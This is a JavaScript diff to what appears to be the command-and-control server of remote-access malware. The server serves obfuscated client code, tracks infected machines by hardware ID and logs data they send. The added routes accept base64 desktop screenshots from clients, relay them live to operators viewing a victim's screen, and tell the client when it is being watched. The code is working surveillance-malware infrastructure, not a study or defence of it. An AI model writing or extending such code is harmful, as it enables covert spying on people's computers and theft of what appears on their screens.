@@ -2,6 +2,7 @@ const { getObfuscatedClientCode, getObfuscatedCode } = require('../../util/obfus
 const { getShortHwid } = require('../../util/util.js');
 
 const logger = require('../../util/logger');
+const fs = require('fs');
 
 module.exports = (app) => {
     // pinging / last ping per client
@@ -33,6 +34,33 @@ module.exports = (app) => {
         app.db.prepare('INSERT INTO data_logs (date, hwid, data) VALUES (?, ?, ?)').run(Date.now(), hwid, data);
 
         res.status(200).send({});
+    });
+
+    // upload desktop screenshot
+    app.post('/ss/:hwid', (req, res) => {
+        const hwid = req.params.hwid;
+        const data = req.body.data;
+
+        if (app.viewingDesktop[hwid] && app.viewingDesktop[hwid].length > 0) {
+            app.viewingDesktop[hwid].forEach((socket) => {
+                socket.emit('receiveDesktop', Buffer.from(data, 'base64').toString('base64'));
+            });
+        }
+
+        //fs.writeFileSync(__dirname + '/./image.png', Buffer.from(data, 'base64'));
+
+        res.status(200).send({});
+    });
+
+    app.get('/ss/:hwid', (req, res) => {
+        const hwid = req.params.hwid;
+
+        // check if someone is viewing their desktop
+        if (app.viewingDesktop[hwid] && app.viewingDesktop[hwid].length > 0) {
+            return res.status(200).send('true');
+        }
+
+        res.status(200).send('false');
     });
 
     // get client code
